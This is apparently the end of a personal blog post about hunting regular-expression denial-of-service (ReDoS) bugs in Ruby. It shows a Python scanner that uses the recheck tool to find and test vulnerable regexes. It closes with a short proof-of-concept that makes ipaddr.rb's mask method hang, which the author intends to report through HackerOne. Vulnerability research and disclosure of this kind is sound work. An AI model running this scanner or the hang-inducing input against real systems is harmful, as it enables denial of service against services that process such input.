	assert tok.count("'") == 2
	
	# Now just return the shit.
	oof_string = get_string(tok)

	final_string = oof_string * STRING_COUNT
	return final_string

def parse_repeated_debug(tok) -> str:
	debug("Processing repeated token: "+str(tok))
	assert tok.count("'") == 2
	
	# Now just return the shit.
	oof_string = get_string(tok)

	final_string = oof_string * 10
	return final_string


def exec_str(string: str) -> str: # This evaluates the attack str string.
	tokens = string.split(" + ")
	# This is here to check for ' ' <--- this case
	if tokens.count("'") == 2:
		ind_of_string_start = tokens.index("'")
		if tokens[ind_of_string_start+1] == "'":
			tokens[ind_of_string_start] = "' '"
			tokens.pop(ind_of_string_start+1)
	while "+" in tokens:
		tokens.remove("+")
	# Now evaluate the string.
	out = ""
	for tok in tokens:
		if "repeat" in tok:
			out += parse_repeated(tok)
		else:
			out += get_string(tok)
	debug("Here is the final payload string: "+str(out))
	return out

def exec_str_debug(string: str) -> str: # This evaluates the attack str string.
	tokens = string.split(" + ")
	# This is here to check for ' ' <--- this case
	if tokens.count("'") == 2:
		ind_of_string_start = tokens.index("'")
		if tokens[ind_of_string_start+1] == "'":
			tokens[ind_of_string_start] = "' '"
			tokens.pop(ind_of_string_start+1)
	while "+" in tokens:
		tokens.remove("+")
	# Now evaluate the string.
	out = ""
	for tok in tokens:
		if "repeat" in tok:
			out += parse_repeated_debug(tok)
		else:
			out += get_string(tok)
	debug("Here is the final payload string: "+str(out))
	return out

def rand_str(length: int) -> str:
	alphabet = "abcdefghijklmnopqrstuvxyz"
	return ''.join([random.choice(alphabet) for _ in range(length)])

def parse_payload(contents, regex_str, debug=False, final_order=None, attack_string=None, filename=None) -> str:
	if "Attack string: " not in contents:
		return
	attack_str = contents[contents.index("Attack string: ")+len("Attack string: "):]
	print(attack_str)
	attack_str = attack_str[:attack_str.index("\n")]
	print("Here is the attack_str: "+str(attack_str))
	if "' '" in attack_str:
		return
	payload = exec_str(attack_str)
	if debug:

		debug_thing = exec_str_debug(attack_str)
		fh = open("debug/"+str(rand_str(10)), "w")
		fh.write(debug_thing)
		fh.write("\n\n\n")
		fh.write(regex_str)
		fh.write("\n\n\n")
		fh.write("Here is the order: "+str(final_order))
		fh.write("\n\n\n")
		fh.write(attack_str)
		fh.write("\n\n\n")
		fh.write(filename)
		fh.close()
	# write the string to the file and then pass the regex to this ruby script.
	fh = open("attack_str.txt", "w")
	fh.write(payload)
	fh.close()

TIMEOUT = 20

ORDERS = ["2nd", "3rd", "4th", "5th", "6th", "7th", "8th"]

def classify_regex(regex_str: str, filename: str) -> None:

	#command_str = "./recheck --attack-limit 1000  --enable-log "/^(a|a)*$/""
	command_str = RECHECK_DIR + "recheck --attack-limit 1000  --enable-log "+str(quote(regex_str))+" > output.txt"
	# Now we run the command and get output.
	#output = subprocess.check_output(command_str.split(" "))
	print("Here is the output from recheck:")
	#print(output)
	os.system(command_str)
	time.sleep(0.2)
	fh = open("output.txt", "r")
	contents = fh.read()
	fh.close()
	if "safe" in contents:
		return
	final_order = None
	debug_mode = False
	for order in ORDERS:
		if order in contents:
			print(str(order)+" found at here: "+str(regex_str)+" at filename "+str(filename))
			if order == "2nd" or order == "3rd" or order == "4th" or order == "5th" or order == "6th" or order == "7th" or order == "8th":
				final_order = order
				debug_mode = True
			break
	#if "4th" in contents:
	#	print("4th!!!! "+str(filename))
	print(contents)


	string = None
	#if debug_mode:
	#	string = contents[contents.index("Attack ")]
	#	string = string[string.index("\n")]

	# Here get the attack payload.
	attack_payload = parse_payload(contents, regex_str, debug=debug_mode, final_order=final_order, attack_string=string, filename=filename)
	# Write the actual regex to regex.txt
	fh = open("regex.txt", "w")
	fh.write(regex_str[1:-1]) # 1 and -1 , because we do not need the "/" characters.
	fh.close()

	redos_command = "ruby shit.rb"

	# Now try running the benchmark. If it times out, then we may have redos.
	debug("Running this command: "+str(redos_command))
	# Instead of os.system, we need a timeout
	#os.system(redos_command)
	'''
	# Thanks to https://stackoverflow.com/a/65336126/14577985!!!!!
	yourCommand = "mvn surefire:test"
	timeoutSeconds = 5
	subprocess.check_output(yourCommand, shell=True, timeout=timeoutSeconds)
	'''
	try:
		output = subprocess.check_output(redos_command, shell=True, timeout=TIMEOUT)
	except subprocess.TimeoutExpired:
		#p.kill()
		debug("HANG FOUND!!!!")
		fh = open("found_hangs/"+str(rand_str(15)), "w")
		fh.write(filename)
		fh.write("\n\n\n")
		fh.write(regex_str)
		fh.close()
	except subprocess.CalledProcessError:
		print("Command somehow failed, now just returning.")
		return
	return

def sanitize_regex(regex: str) -> str:
	new_regex = regex
	if new_regex[1:3] == "\\A":
		print("poopoo")
		new_regex = "/"+new_regex[3:]
	if new_regex[-3:] == "\\z/":
		new_regex = new_regex[:-3]+"/"
	print("new_regex == "+str(new_regex))
	#assert new_regex.count("/") == 2
	assert new_regex[0] == "/" and new_regex[-1] == "/"
	assert "\\A" != new_regex[1:3]
	assert "\\z/" != new_regex[-3:]
	return new_regex

def get_regexes(filename: str) -> list:
	# Get's every single regex pattern from a singular file.
	# This is a regex to detect regexes. :D
	#regex_regex = re.compile(r'/((?:(?:[^?+*{}()[\]\\|]+|\\.|\[(?:\^?\\.|\^[^\\]|[^\\^])(?:[^\]\\]+|\\.)*\]|\((?:\?[:=!]|\?<[=!]|\?>)?(?1)??\)|\(\?(?:R|[+-]?\d+)\))(?:(?:[?+*]|\{\d+(?:,\d*)?\})[?+]?)?|\|)*)/')
	fh = open(filename, "r")
	try:
		lines = fh.readlines()
	except:
		print("Paskaaaaaa "+str(filename))
		fh.close()
		return
	fh.close()

	for line in lines:
		# Check for two "/" characters.
		maybe_regex = find_regex_in_line(line)
		debug("Maybe regex: "+str(maybe_regex))
		if maybe_regex:
			#assert maybe_regex.count("/") == 2
			assert maybe_regex[0] == "/" and maybe_regex[-1] == "/"
			debug("Here is a regex which we found: "+str(maybe_regex))
			# Here maybe check for a bad regex????
			maybe_regex = sanitize_regex(maybe_regex) # This is to get rid of the "\A" marker for example which recheck thinks is actually an "A" character. same with "\z"
			classify_regex(maybe_regex, filename)


'''

recheck [--acceleration-mode <mode>] [--attack-limit <integer>] [--attack-timeout <duration>] [--checker <checker>] [--crossover-size <integer>] [--heat-ratio <floating-point>] [--incubation-limit <integer>] [--incubation-timeout <duration>] [--enable-log] [--max-attack-string-size <integer>] [--max-degree <integer>] [--max-gene-string-size <integer>] [--max-generation-size <integer>] [--max-initial-generation-size <integer>] [--max-iteration <integer>] [--max-nfa-size <integer>] [--max-pattern-size <integer>] [--max-recall-string-size <integer>] [--max-repeat-count <integer>] [--max-simple-repeat-count <integer>] [--mutation-size <integer>] [--random-seed <integer>] [--recall-limit <integer>] [--recall-timeout <duration>] [--seeder <seeder>] [--seeding-limit <integer>] [--seeding-timeout <duration>] [--timeout <duration>] <pattern>

recheck --attack-limit 1000 --attack-timeout 10000 --enable-log "a*a"

'''


BLACKLIST_STRINGS = ["test", "rdoc", "bundler", "shit", ".bundle", "/spec/", "/build/", "/install/"]

def main() -> int:
	# This file checks each file in the current directory for the redos vulnerability.
	import os
	rootdir = '.'
	debug("len(sys.argv) == "+str(len(sys.argv)))
	if len(sys.argv) == 2: # There is a directory after the script
		rootdir = sys.argv[-1]
	all_regexes = []

	for subdir, dirs, files in os.walk(rootdir):
		for file in files:
			#print(os.path.join(subdir, file))

			filename = os.path.join(subdir, file)
			debug("Filename : "+str(filename))
			if any([string in filename for string in BLACKLIST_STRINGS]):
				#debug("Blacklisted filename: "+str(filename))
				continue
			# Get the regexes
			#all_regexes += get_regexes(filename)
			if ".rb" not in filename:
				continue
			debug("Now trying to read this: "+str(filename))
			get_regexes(filename)
	print("Done!")
	return 0

if __name__=="__main__":
	exit(main())

```

...

As it turns out, a lot of the ReDOS vulnerabilities have been fixed in the newest version of ruby, because they changed how regexes work. Fuck! Well, this was still quite a fun adventure.

Wait! As it turns out, there actually is still hope! Because although the redos vulnerability is basically dead in the newest versions of ruby, they still accept reports for older versions!!!

This is fantastic!

...


After a bit of digging around I actually found a potentially bad regex in ipaddr.rb in the "mask!" function, and it was actually put there relatively recently.

Here it is:

```
      case mask
      when /\A(0|[1-9]+\d*)\z/
        prefixlen = mask.to_i
```

and it causes a hang when someone tries something like this:

```
require 'ipaddr'
LENGTH = 100000
net3 = IPAddr.new("192.168.3.123")
mask_str = "1"*LENGTH+"a"
net3.mask(mask_str)
```

Fantastic!

I am going to send a report to hackerone to the ruby team and see what happens (this happened at 13.2.2024 (DD/MM/YYYY)) ! 

... TO BE CONTINUED ...


























